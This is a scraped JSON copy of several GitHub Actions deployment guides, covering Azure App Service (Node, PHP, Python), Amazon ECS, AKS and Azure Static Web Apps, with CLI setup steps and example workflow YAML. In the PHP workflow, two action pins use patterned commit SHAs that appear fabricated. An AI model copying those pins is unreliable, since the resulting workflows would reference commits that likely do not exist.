        "content": "# This workflow uses actions that are not certified by GitHub.\n# They are provided by a third-party and are governed by\n# separate terms of service, privacy policy, and support\n# documentation.\n\n# GitHub recommends pinning actions to a commit SHA.\n# To get a newer version, you will need to update the SHA.\n# You can also reference a tag or branch, but the action may change without warning.\n\non:\n  push:\n    branches:\n      - main\n\nenv:\n  AZURE_WEBAPP_NAME: MY_WEBAPP_NAME   # set this to your application's name\n  AZURE_WEBAPP_PACKAGE_PATH: '.'      # set this to the path to your web app project, defaults to the repository root\n  NODE_VERSION: '14.x'                # set this to the node version to use\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n    - uses: actions/checkout@v4\n\n    - name: Set up Node.js\n      uses: actions/setup-node@v4\n      with:\n        node-version: ${{ env.NODE_VERSION }}\n        cache: 'npm'\n\n    - name: npm install, build, and test\n      run: |\n        npm install\n        npm run build --if-present\n        npm run test --if-present\n    - name: Upload artifact for deployment job\n      uses: actions/upload-artifact@v4\n      with:\n        name: node-app\n        path: .\n\n  deploy:\n    runs-on: ubuntu-latest\n    needs: build\n    environment:\n      name: 'production'\n      url: ${{ steps.deploy-to-webapp.outputs.webapp-url }}\n\n    steps:\n    - name: Download artifact from build job\n      uses: actions/download-artifact@v4\n      with:\n        name: node-app\n\n    - name: 'Deploy to Azure WebApp'\n      id: deploy-to-webapp\n      uses: azure/webapps-deploy@85270a1854658d167ab239bce43949edb336fa7c\n      with:\n        app-name: ${{ env.AZURE_WEBAPP_NAME }}\n        publish-profile: ${{ secrets.AZURE_WEBAPP_PUBLISH_PROFILE }}\n        package: ${{ env.AZURE_WEBAPP_PACKAGE_PATH }}"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Additional resources"
      },
      {
        "type": "paragraph",
        "text": "The following resources may also be useful:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "For the original workflow template, seeazure-webapps-node.ymlin the GitHub Actionsstarter-workflowsrepository.",
          "The action used to deploy the web app is the official AzureAzure/webapps-deployaction.",
          "For more examples of GitHub Action workflows that deploy to Azure, see theactions-workflow-samplesrepository.",
          "TheCreate a Node.js web app in Azurequickstart in the Azure web app documentation demonstrates using Visual Studio Code with theAzure App Service extension."
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/use-cases-and-examples/deploying/deploying-php-to-azure-app-service",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Introduction"
      },
      {
        "type": "paragraph",
        "text": "This guide explains how to use GitHub Actions to build and deploy a PHP project toAzure App Service."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "If your GitHub Actions workflows need to access resources from a cloud provider that supports OpenID Connect (OIDC), you can configure your workflows to authenticate directly to the cloud provider. This will let you stop storing these credentials as long-lived secrets and provide other security benefits. For more information, seeAbout security hardening with OpenID Connect. andConfiguring OpenID Connect in Azure."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Prerequisites"
      },
      {
        "type": "paragraph",
        "text": "Before creating your GitHub Actions workflow, you will first need to complete the following setup steps:"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Create an Azure App Service plan.For example, you can use the Azure CLI to create a new App Service plan:Bashaz appservice plan create \\\n   --resource-group MY_RESOURCE_GROUP \\\n   --name MY_APP_SERVICE_PLAN \\\n   --is-linuxaz appservice plan create \\\n   --resource-group MY_RESOURCE_GROUP \\\n   --name MY_APP_SERVICE_PLAN \\\n   --is-linuxIn the command above, replaceMY_RESOURCE_GROUPwith your pre-existing Azure Resource Group, andMY_APP_SERVICE_PLANwith a new name for the App Service plan.See the Azure documentation for more information on using theAzure CLI:For authentication, seeSign in with Azure CLI.If you need to create a new resource group, seeaz group.",
          "For authentication, seeSign in with Azure CLI.",
          "If you need to create a new resource group, seeaz group.",
          "Create a web app.For example, you can use the Azure CLI to create an Azure App Service web app with a PHP runtime:Bashaz webapp create \\\n    --name MY_WEBAPP_NAME \\\n    --plan MY_APP_SERVICE_PLAN \\\n    --resource-group MY_RESOURCE_GROUP \\\n    --runtime \"php|7.4\"az webapp create \\\n    --name MY_WEBAPP_NAME \\\n    --plan MY_APP_SERVICE_PLAN \\\n    --resource-group MY_RESOURCE_GROUP \\\n    --runtime\"php|7.4\"In the command above, replace the parameters with your own values, whereMY_WEBAPP_NAMEis a new name for the web app.",
          "Configure an Azure publish profile and create anAZURE_WEBAPP_PUBLISH_PROFILEsecret.Generate your Azure deployment credentials using a publish profile. For more information, seeGenerate deployment credentialsin the Azure documentation.In your GitHub repository, create a secret namedAZURE_WEBAPP_PUBLISH_PROFILEthat contains the contents of the publish profile. For more information on creating secrets, seeUsing secrets in GitHub Actions.",
          "Optionally, configure a deployment environment. Environments are used to describe a general deployment target likeproduction,staging, ordevelopment. When a GitHub Actions workflow deploys to an environment, the environment is displayed on the main page of the repository. You can use environments to require approval for a job to proceed, restrict which branches can trigger a workflow, gate deployments with custom deployment protection rules, or limit access to secrets. For more information about creating environments, seeManaging environments for deployment."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Creating the workflow"
      },
      {
        "type": "paragraph",
        "text": "Once you've completed the prerequisites, you can proceed with creating the workflow."
      },
      {
        "type": "paragraph",
        "text": "The following example workflow demonstrates how to build and deploy a PHP project to Azure App Service when there is a push to themainbranch."
      },
      {
        "type": "paragraph",
        "text": "Ensure that you setAZURE_WEBAPP_NAMEin the workflowenvkey to the name of the web app you created. If the path to your project is not the repository root, changeAZURE_WEBAPP_PACKAGE_PATHto the path to your project. If you use a version of PHP other than8.x, changePHP_VERSIONto the version that you use."
      },
      {
        "type": "paragraph",
        "text": "If you configured a deployment environment, change the value ofenvironmentto be the name of your environment. If you did not configure an environment or if your workflow is in a private repository and you do not use GitHub Enterprise Cloud, delete theenvironmentkey."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "# This workflow uses actions that are not certified by GitHub.\n# They are provided by a third-party and are governed by\n# separate terms of service, privacy policy, and support\n# documentation.\n\n# GitHub recommends pinning actions to a commit SHA.\n# To get a newer version, you will need to update the SHA.\n# You can also reference a tag or branch, but the action may change without warning.\n\nname: Build and deploy PHP app to Azure Web App\n\nenv:\n  AZURE_WEBAPP_NAME: MY_WEBAPP_NAME   # set this to your application's name\n  AZURE_WEBAPP_PACKAGE_PATH: '.'      # set this to the path to your web app project, defaults to the repository root\n  PHP_VERSION: '8.x'                  # set this to the PHP version to use\n\non:\n  push:\n    branches:\n      - main\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup PHP\n        uses: shivammathur/setup-php@1f2e3d4c5b6a7f8e9d0c1b2a3e4f5d6c7b8a9e0f\n        with:\n          php-version: ${{ env.PHP_VERSION }}\n\n      - name: Check if composer.json exists\n        id: check_files\n        uses: andstor/file-existence-action@2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b\n        with:\n          files: 'composer.json'\n\n      - name: Get Composer Cache Directory\n        id: composer-cache\n        if: steps.check_files.outputs.files_exists == 'true'\n        run: |\n          echo \"dir=$(composer config cache-files-dir)\" >> $GITHUB_OUTPUT\n\n      - name: Set up dependency caching for faster installs\n        uses: actions/cache@v4\n        if: steps.check_files.outputs.files_exists == 'true'\n        with:\n          path: ${{ steps.composer-cache.outputs.dir }}\n          key: ${{ runner.os }}-composer-${{ hashFiles('**/composer.lock') }}\n          restore-keys: |\n            ${{ runner.os }}-composer-\n\n      - name: Run composer install if composer.json exists\n        if: steps.check_files.outputs.files_exists == 'true'\n        run: composer validate --no-check-publish && composer install --prefer-dist --no-progress\n\n      - name: Upload artifact for deployment job\n        uses: actions/upload-artifact@v4\n        with:\n          name: php-app\n          path: .\n\n  deploy:\n    runs-on: ubuntu-latest\n    needs: build\n    environment:\n      name: 'production'\n      url: ${{ steps.deploy-to-webapp.outputs.webapp-url }}\n\n    steps:\n      - name: Download artifact from build job\n        uses: actions/download-artifact@v4\n        with:\n          name: php-app\n\n      - name: 'Deploy to Azure Web App'\n        id: deploy-to-webapp\n        uses: azure/webapps-deploy@85270a1854658d167ab239bce43949edb336fa7c\n        with:\n          app-name: ${{ env.AZURE_WEBAPP_NAME }}\n          publish-profile: ${{ secrets.AZURE_WEBAPP_PUBLISH_PROFILE }}\n          package: ."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Additional resources"
      },
      {
        "type": "paragraph",
        "text": "The following resources may also be useful:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "For the original workflow template, seeazure-webapps-php.ymlin the GitHub Actionsstarter-workflowsrepository.",
          "The action used to deploy the web app is the official AzureAzure/webapps-deployaction.",
          "For more examples of GitHub Action workflows that deploy to Azure, see theactions-workflow-samplesrepository."
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/use-cases-and-examples/deploying/deploying-python-to-azure-app-service",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Introduction"
      },
      {
        "type": "paragraph",
        "text": "This guide explains how to use GitHub Actions to build and deploy a Python project toAzure App Service."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "If your GitHub Actions workflows need to access resources from a cloud provider that supports OpenID Connect (OIDC), you can configure your workflows to authenticate directly to the cloud provider. This will let you stop storing these credentials as long-lived secrets and provide other security benefits. For more information, seeAbout security hardening with OpenID Connect. andConfiguring OpenID Connect in Azure."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Prerequisites"
      },
      {
        "type": "paragraph",
        "text": "Before creating your GitHub Actions workflow, you will first need to complete the following setup steps:"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Create an Azure App Service plan.For example, you can use the Azure CLI to create a new App Service plan:Bashaz appservice plan create \\\n   --resource-group MY_RESOURCE_GROUP \\\n   --name MY_APP_SERVICE_PLAN \\\n   --is-linuxaz appservice plan create \\\n   --resource-group MY_RESOURCE_GROUP \\\n   --name MY_APP_SERVICE_PLAN \\\n   --is-linuxIn the command above, replaceMY_RESOURCE_GROUPwith your pre-existing Azure Resource Group, andMY_APP_SERVICE_PLANwith a new name for the App Service plan.See the Azure documentation for more information on using theAzure CLI:For authentication, seeSign in with Azure CLI.If you need to create a new resource group, seeaz group.",
          "For authentication, seeSign in with Azure CLI.",
          "If you need to create a new resource group, seeaz group.",
          "Create a web app.For example, you can use the Azure CLI to create an Azure App Service web app with a Python runtime:Bashaz webapp create \\\n    --name MY_WEBAPP_NAME \\\n    --plan MY_APP_SERVICE_PLAN \\\n    --resource-group MY_RESOURCE_GROUP \\\n    --runtime \"python|3.8\"az webapp create \\\n    --name MY_WEBAPP_NAME \\\n    --plan MY_APP_SERVICE_PLAN \\\n    --resource-group MY_RESOURCE_GROUP \\\n    --runtime\"python|3.8\"In the command above, replace the parameters with your own values, whereMY_WEBAPP_NAMEis a new name for the web app.",
          "Configure an Azure publish profile and create anAZURE_WEBAPP_PUBLISH_PROFILEsecret.Generate your Azure deployment credentials using a publish profile. For more information, seeGenerate deployment credentialsin the Azure documentation.In your GitHub repository, create a secret namedAZURE_WEBAPP_PUBLISH_PROFILEthat contains the contents of the publish profile. For more information on creating secrets, seeUsing secrets in GitHub Actions.",
          "Add an app setting calledSCM_DO_BUILD_DURING_DEPLOYMENTand set the value to1.",
          "Optionally, configure a deployment environment. Environments are used to describe a general deployment target likeproduction,staging, ordevelopment. When a GitHub Actions workflow deploys to an environment, the environment is displayed on the main page of the repository. You can use environments to require approval for a job to proceed, restrict which branches can trigger a workflow, gate deployments with custom deployment protection rules, or limit access to secrets. For more information about creating environments, seeManaging environments for deployment."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Creating the workflow"
      },
      {
        "type": "paragraph",
        "text": "Once you've completed the prerequisites, you can proceed with creating the workflow."
      },
      {
        "type": "paragraph",
        "text": "The following example workflow demonstrates how to build and deploy a Python project to Azure App Service when there is a push to themainbranch."
      },
      {
        "type": "paragraph",
        "text": "Ensure that you setAZURE_WEBAPP_NAMEin the workflowenvkey to the name of the web app you created. If you use a version of Python other than3.8, changePYTHON_VERSIONto the version that you use."
      },
      {
        "type": "paragraph",
        "text": "If you configured a deployment environment, change the value ofenvironmentto be the name of your environment. If you did not configure an environment or if your workflow is in a private repository and you do not use GitHub Enterprise Cloud, delete theenvironmentkey."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "# This workflow uses actions that are not certified by GitHub.\n# They are provided by a third-party and are governed by\n# separate terms of service, privacy policy, and support\n# documentation.\n\n# GitHub recommends pinning actions to a commit SHA.\n# To get a newer version, you will need to update the SHA.\n# You can also reference a tag or branch, but the action may change without warning.\n\nname: Build and deploy Python app to Azure Web App\n\nenv:\n  AZURE_WEBAPP_NAME: MY_WEBAPP_NAME   # set this to your application's name\n  PYTHON_VERSION: '3.8'               # set this to the Python version to use\n\non:\n  push:\n    branches:\n      - main\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Set up Python version\n        uses: actions/setup-python@v5\n        with:\n          python-version: ${{ env.PYTHON_VERSION }}\n\n      - name: Create and start virtual environment\n        run: |\n          python -m venv venv\n          source venv/bin/activate\n\n      - name: Set up dependency caching for faster installs\n        uses: actions/cache@v4\n        with:\n          path: ~/.cache/pip\n          key: ${{ runner.os }}-pip-${{ hashFiles('**/requirements.txt') }}\n          restore-keys: |\n            ${{ runner.os }}-pip-\n\n      - name: Install dependencies\n        run: pip install -r requirements.txt\n\n      # Optional: Add a step to run tests here (PyTest, Django test suites, etc.)\n\n      - name: Upload artifact for deployment jobs\n        uses: actions/upload-artifact@v4\n        with:\n          name: python-app\n          path: |\n            .\n            !venv/\n  deploy:\n    runs-on: ubuntu-latest\n    needs: build\n    environment:\n      name: 'production'\n      url: ${{ steps.deploy-to-webapp.outputs.webapp-url }}\n\n    steps:\n      - name: Download artifact from build job\n        uses: actions/download-artifact@v4\n        with:\n          name: python-app\n          path: .\n\n      - name: 'Deploy to Azure Web App'\n        id: deploy-to-webapp\n        uses: azure/webapps-deploy@85270a1854658d167ab239bce43949edb336fa7c\n        with:\n          app-name: ${{ env.AZURE_WEBAPP_NAME }}\n          publish-profile: ${{ secrets.AZURE_WEBAPP_PUBLISH_PROFILE }}"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Additional resources"
      },
      {
        "type": "paragraph",
        "text": "The following resources may also be useful:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "For the original workflow template, seeazure-webapps-python.ymlin the GitHub Actionsstarter-workflowsrepository.",
          "The action used to deploy the web app is the official AzureAzure/webapps-deployaction.",
          "For more examples of GitHub Action workflows that deploy to Azure, see theactions-workflow-samplesrepository."
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/use-cases-and-examples/deploying/deploying-to-amazon-elastic-container-service",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Introduction"
      },
      {
        "type": "paragraph",
        "text": "This guide explains how to use GitHub Actions to build a containerized application, push it toAmazon Elastic Container Registry (ECR), and deploy it toAmazon Elastic Container Service (ECS)when there is a push to themainbranch."
      },
      {
        "type": "paragraph",
        "text": "On every new push tomainin your GitHub repository, the GitHub Actions workflow builds and pushes a new container image to Amazon ECR, and then deploys a new task definition to Amazon ECS."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "If your GitHub Actions workflows need to access resources from a cloud provider that supports OpenID Connect (OIDC), you can configure your workflows to authenticate directly to the cloud provider. This will let you stop storing these credentials as long-lived secrets and provide other security benefits. For more information, seeAbout security hardening with OpenID Connect. andConfiguring OpenID Connect in Amazon Web Services."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Prerequisites"
      },
      {
        "type": "paragraph",
        "text": "Before creating your GitHub Actions workflow, you will first need to complete the following setup steps for Amazon ECR and ECS:"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Create an Amazon ECR repository to store your images.For example, usingthe AWS CLI:Bashaws ecr create-repository \\\n    --repository-name MY_ECR_REPOSITORY \\\n    --region MY_AWS_REGIONaws ecr create-repository \\\n    --repository-name MY_ECR_REPOSITORY \\\n    --region MY_AWS_REGIONEnsure that you use the same Amazon ECR repository name (represented here byMY_ECR_REPOSITORY) for theECR_REPOSITORYvariable in the workflow below.Ensure that you use the same AWS region value for theAWS_REGION(represented here byMY_AWS_REGION) variable in the workflow below.",
          "Create an Amazon ECS task definition, cluster, and service.For details, follow theGetting started wizard on the Amazon ECS console, or theGetting started guidein the Amazon ECS documentation.Ensure that you note the names you set for the Amazon ECS service and cluster, and use them for theECS_SERVICEandECS_CLUSTERvariables in the workflow below.",
          "Store your Amazon ECS task definition as a JSON file in your GitHub repository.The format of the file should be the same as the output generated by:Bashaws ecs register-task-definition --generate-cli-skeletonaws ecs register-task-definition --generate-cli-skeletonEnsure that you set theECS_TASK_DEFINITIONvariable in the workflow below as the path to the JSON file.Ensure that you set theCONTAINER_NAMEvariable in the workflow below as the container name in thecontainerDefinitionssection of the task definition.",
          "Create GitHub Actions secrets namedAWS_ACCESS_KEY_IDandAWS_SECRET_ACCESS_KEYto store the values for your Amazon IAM access key.For more information on creating secrets for GitHub Actions, seeUsing secrets in GitHub Actions.See the documentation for each action used below for the recommended IAM policies for the IAM user, and methods for handling the access key credentials.",
          "Optionally, configure a deployment environment. Environments are used to describe a general deployment target likeproduction,staging, ordevelopment. When a GitHub Actions workflow deploys to an environment, the environment is displayed on the main page of the repository. You can use environments to require approval for a job to proceed, restrict which branches can trigger a workflow, gate deployments with custom deployment protection rules, or limit access to secrets. For more information about creating environments, seeManaging environments for deployment."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Creating the workflow"
      },
      {
        "type": "paragraph",
        "text": "Once you've completed the prerequisites, you can proceed with creating the workflow."
      },
      {
        "type": "paragraph",
        "text": "The following example workflow demonstrates how to build a container image and push it to Amazon ECR. It then updates the task definition with the new image ID, and deploys the task definition to Amazon ECS."
      },
      {
        "type": "paragraph",
        "text": "Ensure that you provide your own values for all the variables in theenvkey of the workflow."
      },
      {
        "type": "paragraph",
        "text": "If you configured a deployment environment, change the value ofenvironmentto be the name of your environment. If you did not configure an environment or if your workflow is in a private repository and you do not use GitHub Enterprise Cloud, delete theenvironmentkey."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "# This workflow uses actions that are not certified by GitHub.\n# They are provided by a third-party and are governed by\n# separate terms of service, privacy policy, and support\n# documentation.\n\n# GitHub recommends pinning actions to a commit SHA.\n# To get a newer version, you will need to update the SHA.\n# You can also reference a tag or branch, but the action may change without warning.\n\nname: Deploy to Amazon ECS\n\non:\n  push:\n    branches:\n      - main\n\nenv:\n  AWS_REGION: MY_AWS_REGION                   # set this to your preferred AWS region, e.g. us-west-1\n  ECR_REPOSITORY: MY_ECR_REPOSITORY           # set this to your Amazon ECR repository name\n  ECS_SERVICE: MY_ECS_SERVICE                 # set this to your Amazon ECS service name\n  ECS_CLUSTER: MY_ECS_CLUSTER                 # set this to your Amazon ECS cluster name\n  ECS_TASK_DEFINITION: MY_ECS_TASK_DEFINITION # set this to the path to your Amazon ECS task definition\n                                               # file, e.g. .aws/task-definition.json\n  CONTAINER_NAME: MY_CONTAINER_NAME           # set this to the name of the container in the\n                                               # containerDefinitions section of your task definition\n\njobs:\n  deploy:\n    name: Deploy\n    runs-on: ubuntu-latest\n    environment: production\n\n    steps:\n      - name: Checkout\n        uses: actions/checkout@v4\n\n      - name: Configure AWS credentials\n        uses: aws-actions/configure-aws-credentials@0e613a0980cbf65ed5b322eb7a1e075d28913a83\n        with:\n          aws-access-key-id: ${{ secrets.AWS_ACCESS_KEY_ID }}\n          aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }}\n          aws-region: ${{ env.AWS_REGION }}\n\n      - name: Login to Amazon ECR\n        id: login-ecr\n        uses: aws-actions/amazon-ecr-login@62f4f872db3836360b72999f4b87f1ff13310f3a\n\n      - name: Build, tag, and push image to Amazon ECR\n        id: build-image\n        env:\n          ECR_REGISTRY: ${{ steps.login-ecr.outputs.registry }}\n          IMAGE_TAG: ${{ github.sha }}\n        run: |\n          # Build a docker container and\n          # push it to ECR so that it can\n          # be deployed to ECS.\n          docker build -t $ECR_REGISTRY/$ECR_REPOSITORY:$IMAGE_TAG .\n          docker push $ECR_REGISTRY/$ECR_REPOSITORY:$IMAGE_TAG\n          echo \"image=$ECR_REGISTRY/$ECR_REPOSITORY:$IMAGE_TAG\" >> $GITHUB_OUTPUT\n\n      - name: Fill in the new image ID in the Amazon ECS task definition\n        id: task-def\n        uses: aws-actions/amazon-ecs-render-task-definition@c804dfbdd57f713b6c079302a4c01db7017a36fc\n        with:\n          task-definition: ${{ env.ECS_TASK_DEFINITION }}\n          container-name: ${{ env.CONTAINER_NAME }}\n          image: ${{ steps.build-image.outputs.image }}\n\n      - name: Deploy Amazon ECS task definition\n        uses: aws-actions/amazon-ecs-deploy-task-definition@df9643053eda01f169e64a0e60233aacca83799a\n        with:\n          task-definition: ${{ steps.task-def.outputs.task-definition }}\n          service: ${{ env.ECS_SERVICE }}\n          cluster: ${{ env.ECS_CLUSTER }}\n          wait-for-service-stability: true"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Additional resources"
      },
      {
        "type": "paragraph",
        "text": "For the original workflow template, seeaws.ymlin the GitHub Actionsstarter-workflowsrepository."
      },
      {
        "type": "paragraph",
        "text": "For more information on the services used in these examples, see the following documentation:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Security best practices in IAMin the Amazon AWS documentation.",
          "Official AWSConfigure AWS Credentialsaction.",
          "Official AWSAmazon ECR \"Login\"action.",
          "Official AWSAmazon ECS \"Render Task Definition\"action.",
          "Official AWSAmazon ECS \"Deploy Task Definition\"action."
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/use-cases-and-examples/deploying/deploying-to-azure-kubernetes-service",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Introduction"
      },
      {
        "type": "paragraph",
        "text": "This guide explains how to use GitHub Actions to build and deploy a project toAzure Kubernetes Service."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "If your GitHub Actions workflows need to access resources from a cloud provider that supports OpenID Connect (OIDC), you can configure your workflows to authenticate directly to the cloud provider. This will let you stop storing these credentials as long-lived secrets and provide other security benefits. For more information, seeAbout security hardening with OpenID Connect. andConfiguring OpenID Connect in Azure."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Prerequisites"
      },
      {
        "type": "paragraph",
        "text": "Before creating your GitHub Actions workflow, you will first need to complete the following setup steps:"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Create a target AKS cluster and an Azure Container Registry (ACR). For more information, seeQuickstart: Deploy an AKS cluster by using the Azure portal - Azure Kubernetes ServiceandQuickstart - Create registry in portal - Azure Container Registryin the Azure documentation.",
          "Create a secret calledAZURE_CREDENTIALSto store your Azure credentials. For more information about how to find this information and structure the secret, seetheAzure/loginaction documentation."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Creating the workflow"
      },
      {
        "type": "paragraph",
        "text": "Once you've completed the prerequisites, you can proceed with creating the workflow."
      },
      {
        "type": "paragraph",
        "text": "The following example workflow demonstrates how to build and deploy a project to Azure Kubernetes Service when code is pushed to your repository."
      },
      {
        "type": "paragraph",
        "text": "Under the workflowenvkey, change the following values:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "AZURE_CONTAINER_REGISTRYto the name of your container registry",
          "PROJECT_NAMEto the name of your project",
          "RESOURCE_GROUPto the resource group containing your AKS cluster",
          "CLUSTER_NAMEto the name of your AKS cluster"
        ]
      },
      {
        "type": "paragraph",
        "text": "This workflow uses thehelmrender engine for theazure/k8s-bakeaction. If you will use thehelmrender engine, change the value ofCHART_PATHto the path to your helm file. ChangeCHART_OVERRIDE_PATHto an array of override file paths. If you use a different render engine, update the input parameters sent to theazure/k8s-bakeaction."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "# This workflow uses actions that are not certified by GitHub.\n# They are provided by a third-party and are governed by\n# separate terms of service, privacy policy, and support\n# documentation.\n\n# GitHub recommends pinning actions to a commit SHA.\n# To get a newer version, you will need to update the SHA.\n# You can also reference a tag or branch, but the action may change without warning.\n\nname: Build and deploy to Azure Kubernetes Service\n\nenv:\n  AZURE_CONTAINER_REGISTRY: MY_REGISTRY_NAME # set this to the name of your container registry\n  PROJECT_NAME: MY_PROJECT_NAME              # set this to your project's name\n  RESOURCE_GROUP: MY_RESOURCE_GROUP          # set this to the resource group containing your AKS cluster\n  CLUSTER_NAME: MY_CLUSTER_NAME              # set this to the name of your AKS cluster\n  REGISTRY_URL: MY_REGISTRY_URL              # set this to the URL of your registry\n  # If you bake using helm:\n  CHART_PATH: MY_HELM_FILE                   # set this to the path to your helm file\n  CHART_OVERRIDE_PATH: MY_OVERRIDE_FILES     # set this to an array of override file paths\n\non: [push]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n    - uses: actions/checkout@v4\n\n    - name: Azure Login\n      uses: azure/login@14a755a4e2fd6dff25794233def4f2cf3f866955\n      with:\n        creds: ${{ secrets.AZURE_CREDENTIALS }}\n\n    - name: Build image on ACR\n      uses: azure/CLI@61bb69d64d613b52663984bf12d6bac8fd7b3cc8\n      with:\n        azcliversion: 2.29.1\n        inlineScript: |\n          az configure --defaults acr=${{ env.AZURE_CONTAINER_REGISTRY }}\n          az acr build -t -t ${{ env.REGISTRY_URL }}/${{ env.PROJECT_NAME }}:${{ github.sha }}\n\n    - name: Gets K8s context\n      uses: azure/aks-set-context@94ccc775c1997a3fcfbfbce3c459fec87e0ab188\n      with:\n          creds: ${{ secrets.AZURE_CREDENTIALS }}\n          resource-group: ${{ env.RESOURCE_GROUP }}\n          cluster-name: ${{ env.CLUSTER_NAME }}\n      id: login\n\n    - name: Configure deployment\n      uses: azure/k8s-bake@61041e8c2f75c1f01186c8f05fb8b24e1fc507d8\n      with:\n        renderEngine: 'helm'\n        helmChart: ${{ env.CHART_PATH }}\n        overrideFiles: ${{ env.CHART_OVERRIDE_PATH }}\n        overrides: |\n          replicas:2\n        helm-version: 'latest'\n      id: bake\n\n    - name: Deploys application\n      uses: Azure/k8s-deploy@dd4bbd13a5abd2fc9ca8bdcb8aee152bb718fa78\n      with:\n        manifests: ${{ steps.bake.outputs.manifestsBundle }}\n        images: |\n          ${{ env.AZURE_CONTAINER_REGISTRY }}.azurecr.io/${{ env.PROJECT_NAME }}:${{ github.sha }}\n        imagepullsecrets: |\n          ${{ env.PROJECT_NAME }}"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Additional resources"
      },
      {
        "type": "paragraph",
        "text": "The following resources may also be useful:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "For the original workflow template, seeazure-kubernetes-service.ymlin the GitHub Actionsstarter-workflowsrepository.",
          "The actions used to in this workflow are the official AzureAzure/login,Azure/aks-set-context,Azure/CLI,Azure/k8s-bake, andAzure/k8s-deployactions.",
          "For more examples of GitHub Action workflows that deploy to Azure, see theactions-workflow-samplesrepository."
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/use-cases-and-examples/deploying/deploying-to-azure-static-web-app",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Introduction"
      },
      {
        "type": "paragraph",
        "text": "This guide explains how to use GitHub Actions to build and deploy a web app toAzure Static Web Apps."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "If your GitHub Actions workflows need to access resources from a cloud provider that supports OpenID Connect (OIDC), you can configure your workflows to authenticate directly to the cloud provider. This will let you stop storing these credentials as long-lived secrets and provide other security benefits. For more information, seeAbout security hardening with OpenID Connect. andConfiguring OpenID Connect in Azure."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Prerequisites"
      },
      {
        "type": "paragraph",
        "text": "Before creating your GitHub Actions workflow, you will first need to complete the following setup steps:"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Create an Azure Static Web App using the 'Other' option for deployment source. For more information, seeQuickstart: Building your first static site in the Azure portalin the Azure documentation.",
          "Create a secret calledAZURE_STATIC_WEB_APPS_API_TOKENwith the value of your static web app deployment token. For more information about how to find your deployment token, seeReset deployment tokens in Azure Static Web Appsin the Azure documentation."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Creating the workflow"
      },
      {
        "type": "paragraph",
        "text": "Once you've completed the prerequisites, you can proceed with creating the workflow."
      },
      {
        "type": "paragraph",
        "text": "The following example workflow demonstrates how to build and deploy an Azure static web app when there is a push to themainbranch or when a pull request targetingmainis opened, synchronized, or reopened. The workflow also tears down the corresponding pre-production deployment when a pull request targetingmainis closed."
      },
      {
        "type": "paragraph",
        "text": "Under the workflowenvkey, change the following values:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "APP_LOCATIONto the location of your client code",
          "API_LOCATIONto the location of your API source code. IfAPI_LOCATIONis not relevant, you can delete the variable and the lines where it is used.",
          "OUTPUT_LOCATIONto the location of your client code build output"
        ]
      },
      {
        "type": "paragraph",
        "text": "For more information about these values, seeBuild configuration for Azure Static Web Appsin the Azure documentation."
      },
      {
        "type": "code",
        "language": "yaml",
